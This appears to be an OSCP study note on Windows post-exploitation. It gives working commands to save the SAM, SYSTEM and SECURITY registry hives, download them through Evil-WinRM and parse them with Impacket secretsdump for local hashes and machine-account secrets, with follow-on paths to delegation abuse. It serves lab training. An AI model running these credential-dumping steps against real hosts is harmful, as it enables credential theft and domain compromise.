# Windows - Registry Hive Extraction

**Windows post-exploitation supplement**

*Export SAM, SYSTEM, and SECURITY hives from a local Administrator context and parse them offline.*

## When this route applies

Use this route when the current Windows token is local Administrator or has backup semantics and you need local account hashes, LSA secrets, or a computer-account secret. It is especially useful on an AD member host where the machine account may be needed for RBCD or another Kerberos technique.

## Save the hives

`SAM` contains local account hashes. `SYSTEM` contains the boot key needed to decrypt them. `SECURITY` contains LSA secrets, including the machine account secret on many Windows hosts.

```cmd
reg save HKLM\SAM C:\Temp\SAM /y
reg save HKLM\SYSTEM C:\Temp\SYSTEM /y
reg save HKLM\SECURITY C:\Temp\SECURITY /y
```

Transfer the files through the current authenticated channel. With Evil-WinRM, change to a simple remote directory before downloading so path parsing does not corrupt the destination:

```powershell
New-Item -ItemType Directory -Path C:\Temp -Force
download C:\Temp\SAM
download C:\Temp\SYSTEM
download C:\Temp\SECURITY
```

## Parse locally

```bash
secretsdump.py \
  -sam $BoxDir/loot/SAM \
  -system $BoxDir/loot/SYSTEM \
  -security $BoxDir/loot/SECURITY \
  LOCAL
```

Read the output privately. Save only the needed credential or hash with the loot helper. Do not paste hashes into a shared write-up.

## What did you get?

- [ ] Local Administrator hash → **Validate it with SMB or WinRM using the local-auth context.**
- [ ] `$MACHINE.ACC` secret → **Store the machine NT hash privately and continue to [[AD - Resource-Based Constrained Delegation]] if the ACL path exists.**
- [ ] The hive export returns access denied → **Confirm the shell is elevated, or route through [[AD - Backup Operators]] if the account has the required backup privilege.**
- [ ] `secretsdump.py` import errors → **Check for a system/Python Impacket mismatch and use one consistent installation.**

## Efficiency notes

- Export all three hives once. Repeating only SAM and SYSTEM misses the LSA secret needed for a machine-account route.
- Parse offline. Do not run credential-dumping tools repeatedly against the target.
- Use Evil-WinRM's download function instead of creating an SMB share unless the session is unavailable.

> [!warning] 💡
> A local Administrator hash is not automatically a domain Administrator hash. Record the host and account context with every recovered hash.

> [!warning] 💡
> Remove the hive copies from the target after analysis and verify the paths are absent.

## Seen in

- [[OSCP/BOXES/WRITE UPS/AD/RockyColt|RockyColt]] -- SAM, SYSTEM, and SECURITY extraction from COLTY recovered the COLTY$ machine secret
- [[OSCP/BOXES/WRITE UPS/AD/Fermion|Fermion]] -- offline parsing of the downloaded SYSTEM hive with `ntds.dit` recovered the domain Administrator hash

## Related stages

- [[AD - Privilege Triage]]
- [[AD - Local Credential Search]]
- [[AD - Resource-Based Constrained Delegation]]
- [[AD - Clean Down]]

## External Resources

- [Impacket secretsdump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)
- [Microsoft: Reg Save](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/reg-save)

## Why this matters for OSCP

This is a native Windows credential-recovery route that avoids executing a large post-exploitation framework on the target. It also bridges local Administrator access to AD machine-account abuse when the directory permissions support it.
